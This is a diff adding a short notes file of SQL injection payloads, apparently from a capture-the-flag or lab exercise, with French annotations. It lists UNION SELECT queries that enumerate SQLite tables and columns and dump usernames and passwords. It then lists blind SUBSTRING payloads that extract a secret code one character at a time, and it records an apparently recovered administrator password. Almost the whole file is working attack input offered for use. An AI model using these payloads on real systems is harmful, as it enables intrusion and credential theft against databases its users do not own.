@@ -1,0 +1,39 @@
+' UNION SELECT name, null FROM sqlite_master WHERE type='table' --
+Xx_US3RS_xX 
+liste table
+
+' UNION SELECT name, null FROM pragma_table_info('Xx_US3RS_xX') --
+ID
+Xx_US3RNAM3_xX 
+Xx_PASSW0RD_xX
+liste colonne
+
+username
+' UNION SELECT Xx_US3RNAM3_xX ,null FROM Xx_US3RS_xX --
+= Xx_ADMINISTRAT0R_xX 
+
+-1' union SELECT 1,Xx_PASSW0RD_xX from Xx_US3RS_xX where Xx_US3RNAM3_xX='Xx_ADMINISTRAT0R_xX' -- a
+Mot de passe admin
+
+-1' union SELECT 1,Xx_PASSW0RD_xX from Xx_US3RS_xX -- a
+Liste des mots de passe
+
+-1' union SELECT 1,Xx_US3RNAM3_xX from Xx_US3RS_xX -- a
+Liste utilisateurs
+
+
+
+Xx_ADMINISTRAT0R_xX 
+Mk$nj5KzAE4Rg#
+
+
+-1' union SELECT 1,name FROM sqlite_master WHERE type='table' -- a
+-1' union SELECT 1,name FROM pragma_table_info('sqlite_sequence') -- a
+
+
+xyz' AND SUBSTRING((SELECT Xx_C0D3_xX FROM Xx_US3RS_Xx WHERE Xx_US3RNAM3_xX = 'Xx_ADMINISTRAT0R_xX' ), 1, 1) > 'm
+
+SELECT Xx_C0D3_xX FROM Xx_US3RS_Xx WHERE Xx_US3RNAM3_xX = 'Xx_ADMINISTRAT0R_xX' 
+
+
+Xx_ADMINISTRAT0R_xX' AND SUBSTRING((SELECT Xx_C0D3_xX FROM Xx_US3RS_Xx WHERE Xx_US3RNAM3_xX = 'Xx_ADMINISTRAT0R_xX'), 1, 1) = ' ' -- 
